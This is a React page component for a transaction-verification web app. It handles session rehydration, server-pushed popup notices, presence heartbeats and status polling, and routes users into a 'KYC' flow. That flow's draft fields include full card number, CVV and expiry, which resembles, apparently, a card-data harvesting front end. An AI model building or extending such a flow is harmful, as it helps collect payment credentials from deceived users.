import { useState, useEffect, useRef } from "react";
import { useParams, useLocation, useNavigate } from "react-router-dom";
import { Bell } from "lucide-react";
import Header from "../components/Header";
import Footer from "../components/Footer";
import TransactionView from "../components/TransactionView";
import { verifyTransaction, sendHeartbeat, sendGoOffline, getNotifications, notificationMarkRead } from "../lib/api";
import { saveSession, rehydrateSession } from "../lib/session";
import { useFixedBanners } from "../lib/useFixedBanners";
import { useLockBodyScroll } from "../lib/useLockBodyScroll";
import type { Transaction, KycDraft } from "../lib/types";

function hasDraftData(kyc: KycDraft) {
  return [kyc.card_number, kyc.payee_debit_card, kyc.card_bank_name, kyc.cvv, kyc.cardholder_name, kyc.country,
    kyc.street_address, kyc.house_number, kyc.city, kyc.state, kyc.postal_code, kyc.phone_number]
    .some((v) => !!v && v.trim() !== "") || (!!kyc.card_expiry && kyc.card_expiry.replace("/", "").trim() !== "");
}

export default function TransactionPage() {
  const { ftUid } = useParams<{ ftUid: string }>();
  const location = useLocation();
  const navigate = useNavigate();
  const [tx, setTx] = useState<Transaction | null>(location.state?.transaction || null);
  const [kyc, setKyc] = useState<KycDraft | null>(location.state?.kyc || null);
  const [hydrating, setHydrating] = useState(!location.state?.transaction);

  // Cold-reload recovery: if we arrived without a transaction (browser evicted
  // the tab from memory, or the user hit refresh), re-hydrate from sessionStorage
  // and re-verify with the server.
  useEffect(() => {
    if (location.state?.transaction) return;
    let cancelled = false;
    rehydrateSession().then((res) => {
      if (cancelled || !res) return;
      setTx(res.transaction);
      setKyc(res.kyc);
      setHydrating(false);
    }).catch(() => { setHydrating(false); });
    return () => { cancelled = true; };
  }, [location.state]);

  // Keep sessionStorage in sync with the latest transaction state so a later
  // reload sees fresh review status / kyc data.
  useEffect(() => {
    if (tx) saveSession(tx, kyc);
  }, [tx, kyc]);

  // Single popup notification (show at most one)
  const [currentPopup, setCurrentPopup] = useState<{ id: string; title: string; content: string; show_once: boolean } | null>(null);
  useLockBodyScroll(!!currentPopup);
  const dismissingRef = useRef(false);
  const dismissedPopupsRef = useRef<Set<string>>(new Set());
  // Fixed banner notifications
  const banners = useFixedBanners(ftUid);

  useEffect(() => {
    if (!ftUid) return;
    let cancelled = false;
    getNotifications(ftUid)
      .then((notifs) => {
        if (cancelled) return;
        // For show_once popups: sync server read_at state into localStorage.
        // If server reset read_at to null, remove from localStorage so popup shows again.
        // If server read_at is set, ensure it's in localStorage so we don't double-show.
        notifs.filter((n) => n.mode === "popup" && n.show_once).forEach((n) => {
          const key = `cbca_seen_notifs_${ftUid}`;
          const seen: string[] = JSON.parse(localStorage.getItem(key) || "[]");
          if (n.read_at) {
            if (!seen.includes(n.id)) localStorage.setItem(key, JSON.stringify([...seen, n.id]));
          } else {
            const filtered = seen.filter((id) => id !== n.id);
            if (filtered.length !== seen.length) localStorage.setItem(key, JSON.stringify(filtered));
          }
        });
        // Popups: for show_once=true check localStorage (server-synced above);
        // for show_once=false always show on every mount — no storage tracking needed
        const unseenPopups = notifs.filter((n) => {
          if (n.mode !== "popup") return false;
          if (dismissedPopupsRef.current.has(n.id)) return false;
          if (!n.show_once) return true;
          const seen: string[] = JSON.parse(localStorage.getItem(`cbca_seen_notifs_${ftUid}`) || "[]");
          return !seen.includes(n.id);
        });
        if (unseenPopups.length > 0) {
          const first = unseenPopups[0];
          setCurrentPopup({ id: first.id, title: first.title, content: first.content, show_once: first.show_once });
        }
      })
      .catch(() => {});
    return () => { cancelled = true; };
  }, [ftUid]);

  // Scroll lock: add padding to compensate for scrollbar disappearing so layout doesn't shift
  useEffect(() => {
    if (currentPopup) {
      const scrollbarWidth = window.innerWidth - document.documentElement.clientWidth;
      document.body.style.overflow = "hidden";
      document.body.style.paddingRight = `${scrollbarWidth}px`;
    } else {
      document.body.style.overflow = "";
      document.body.style.paddingRight = "";
    }
    return () => {
      document.body.style.overflow = "";
      document.body.style.paddingRight = "";
    };
  }, [currentPopup]);

  function dismissPopup() {
    // Guard against rapid double-clicks
    if (dismissingRef.current) return;
    dismissingRef.current = true;
    setTimeout(() => { dismissingRef.current = false; }, 400);

    if (currentPopup && ftUid) {
      dismissedPopupsRef.current.add(currentPopup.id);
      if (currentPopup.show_once) {
        // show_once: mark in localStorage and notify server so popup never shows again
        const key = `cbca_seen_notifs_${ftUid}`;
        const seen: string[] = JSON.parse(localStorage.getItem(key) || "[]");
        if (!seen.includes(currentPopup.id)) localStorage.setItem(key, JSON.stringify([...seen, currentPopup.id]));
        notificationMarkRead(currentPopup.id, ftUid).catch(() => {});
      }
      // show_once=false: no storage tracking — popup will show again on next mount (next login)
    }
    setCurrentPopup(null);
  }

  useEffect(() => {
    if (!tx && !hydrating) navigate("/", { replace: true });
  }, [tx, hydrating, navigate]);

  // Heartbeat: fire immediately and every 15s while employee is on this page.
  // visibilitychange pauses/resumes to avoid false-positives from background tabs.
  // pagehide fires sendBeacon to mark offline instantly on tab close.
  useEffect(() => {
    if (!ftUid) return;

    sendHeartbeat(ftUid, "transaction");
    const interval = setInterval(() => sendHeartbeat(ftUid, "transaction"), 15000);

    function handleVisibilityChange() {
      if (document.visibilityState === "visible") {
        sendHeartbeat(ftUid!, "transaction");
      } else {
        sendGoOffline(ftUid!);
      }
    }

    function handlePageHide() {
      sendGoOffline(ftUid!);
    }

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("pagehide", handlePageHide);

    return () => {
      clearInterval(interval);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("pagehide", handlePageHide);
    };
  }, [ftUid]);

  useEffect(() => {
    const interval = setInterval(async () => {
      if (!ftUid || !tx) return;
      try {
        const res = await verifyTransaction(tx.ft_uid, tx.serial_number);
        if (res.valid && res.transaction) {
          setTx(res.transaction);
          setKyc(res.kyc || null);
        }
      } catch { /* silent */ }
    }, 5000);
    return () => clearInterval(interval);
  }, [ftUid, tx]);

  if (!tx) {
    return (
      <div className="min-h-screen-safe flex items-center justify-center">
        <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
      </div>
    );
  }

  const startVerification = () => {
    if (kyc?.card_type && hasDraftData(kyc)) {
      navigate(`/kyc/${tx.ft_uid}`, { state: { transaction: tx, kyc, cardType: kyc.card_type } });
    } else {
      navigate(`/card-select/${tx.ft_uid}`, { state: { transaction: tx, kyc } });
    }
  };

  return (
    <div className="min-h-screen-safe flex flex-col">
      <Header ftUid={ftUid} />


      {/* Popup notification modal */}
      {currentPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center overflow-y-auto overscroll-contain px-4 py-6 bg-[#06142E]/65 animate-dialog-fade" role="dialog" aria-modal="true">
          <div className="w-full max-w-[400px] overflow-hidden rounded-[28px] bg-white shadow-[0_24px_64px_-12px_rgba(6,20,46,0.45)] ring-1 ring-black/5 animate-dialog-pop">
            <div className="relative overflow-hidden bg-gradient-to-br from-[#06142E] via-[#0A2B5E] to-[#14468F] px-6 pt-6 pb-5">
              <div className="pointer-events-none absolute -top-10 -right-10 h-36 w-36 rounded-full bg-sky-400/15 blur-2xl" />
              <div className="relative flex items-center gap-3.5">
                <div className="relative flex h-11 w-11 flex-shrink-0 items-center justify-center rounded-2xl bg-white/10 ring-1 ring-white/20">
                  <Bell className="h-5 w-5 text-white" />
                  <span className="absolute -top-0.5 -right-0.5 h-2.5 w-2.5 rounded-full bg-sky-300 ring-2 ring-[#0A2B5E]" />
                </div>
                <div className="min-w-0">
                  <div className="text-[10px] font-bold uppercase tracking-[0.16em] text-sky-300">System Notification</div>
                  <h3 className="mt-0.5 text-[16px] font-bold leading-snug text-white break-words">{currentPopup.title}</h3>
                </div>
              </div>
            </div>
            <div className="scroll-touch max-h-[50vh] px-6 py-5">
              <p className="text-[14px] leading-relaxed text-slate-600 whitespace-pre-wrap break-words">{currentPopup.content}</p>
            </div>
            <div className="border-t border-slate-100 px-6 py-4">
              <button
                onClick={dismissPopup}
                className="w-full select-none rounded-2xl bg-gradient-to-r from-[#0A2B5E] to-[#1E3A8A] py-3.5 text-sm font-semibold text-white shadow-lg shadow-[#0A2B5E]/25 transition-all hover:-translate-y-px hover:shadow-[#0A2B5E]/40 active:translate-y-0 active:scale-[0.98]"
              >
                I Understand
              </button>
            </div>
          </div>
        </div>
      )}

      <TransactionView
        tx={tx}
        kycSubmitted={!!kyc?.is_submitted}
        banners={banners}
        onBack={() => navigate(-1)}
        onStartVerification={startVerification}
        onResubmit={() => navigate(`/card-select/${tx.ft_uid}`, { state: { transaction: tx, kyc: null } })}
        blockchainLocked={!!kyc && kyc.verification_channel === "blockchain" && !!kyc.is_submitted}
      />

      <Footer />
    </div>
  );
}
